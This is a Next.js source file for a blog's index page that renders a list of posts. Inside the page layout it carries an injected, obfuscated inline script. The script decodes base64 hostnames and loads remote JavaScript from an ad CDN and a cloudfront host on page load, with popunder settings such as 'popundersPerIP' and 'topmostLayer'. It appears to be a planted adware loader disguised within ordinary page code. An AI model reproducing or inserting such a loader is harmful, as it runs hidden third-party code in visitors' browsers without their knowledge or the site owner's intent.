import Link from 'next/link';
import { getPosts } from '../utils/mdx-utils';

import Footer from '../components/Footer';
import Header from '../components/Header';
import Layout, { GradientBackground } from '../components/Layout';
import ArrowIcon from '../components/ArrowIcon';
import { getGlobalData } from '../utils/global-data';
import SEO from '../components/SEO';

export default function Index({ posts, globalData }) {
  return (
    <Layout>
      <script type="text/javascript" data-cfasync="false">
    /*<![CDATA[/* */
    (function(){var h=window,l="b304c9f893e53c18f0b51568f62d7c77",g=[["siteId",380-227*229-253+5125068],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer",!0]],o=["d3d3LmNkbjRhZHMuY29tL2ltYWdlcy9zdGF0aWMvc2pxdWVyeS50YWJzbGV0Lm1pbi5qcw==","ZDNnNW92Zm5nanc5YncuY2xvdWRmcm9udC5uZXQvaGcycGxvdC5qcw=="],e=-1,w,u,c=function(){clearTimeout(u);e++;if(o[e]&&!(1734017153000<(new Date).getTime()&&1<e)){w=h.document.createElement("script");w.type="text/javascript";w.async=!0;var v=h.document.getElementsByTagName("script")[0];w.src="https://"+atob(o[e]);w.crossOrigin="anonymous";w.onerror=c;w.onload=function(){clearTimeout(u);h[l.slice(0,16)+l.slice(0,16)]||c()};u=setTimeout(c,5E3);v.parentNode.insertBefore(w,v)}};if(!h[l]){try{Object.freeze(h[l]=g)}catch(e){}c()}})();
  /*]]>/* */
  </script>
    
      <SEO title={globalData.name} description={globalData.blogTitle} />
      <Header name={globalData.name} />
      <main className="w-full">
        <h1 className="text-3xl lg:text-5xl text-center mb-12">
          {globalData.blogTitle}
        </h1>
        <ul className="w-full">
          {posts.map((post) => (
            <li
              key={post.filePath}
              className="md:first:rounded-t-lg md:last:rounded-b-lg backdrop-blur-lg bg-white dark:bg-black dark:bg-opacity-30 bg-opacity-10 hover:bg-opacity-20 dark:hover:bg-opacity-50 transition border border-gray-800 dark:border-white border-opacity-10 dark:border-opacity-10 border-b-0 last:border-b hover:border-b hovered-sibling:border-t-0"
            >
              <Link
                as={`/posts/${post.filePath.replace(/\.mdx?$/, '')}`}
                href={`/posts/[slug]`}
              >
                <a className="py-6 lg:py-10 px-6 lg:px-16 block focus:outline-none focus:ring-4">
                  {post.data.date && (
                    <p className="uppercase mb-3 font-bold opacity-60">
                      {post.data.date}
                    </p>
                  )}
                  <h2 className="text-2xl md:text-3xl">{post.data.title}</h2>
                  {post.data.description && (
                    <p className="mt-3 text-lg opacity-60">
                      {post.data.description}
                    </p>
                  )}
                  <ArrowIcon className="mt-4" />
                </a>
              </Link>
            </li>
          ))}
        </ul>
      </main>
      <Footer copyrightText={globalData.footerText} />
      <GradientBackground
        variant="large"
        className="fixed top-20 opacity-40 dark:opacity-60"
      />
      <GradientBackground
        variant="small"
        className="absolute bottom-0 opacity-20 dark:opacity-10"
      />
    </Layout>
  );
}

export function getStaticProps() {
  const posts = getPosts();
  const globalData = getGlobalData();

  return { props: { posts, globalData } };
}
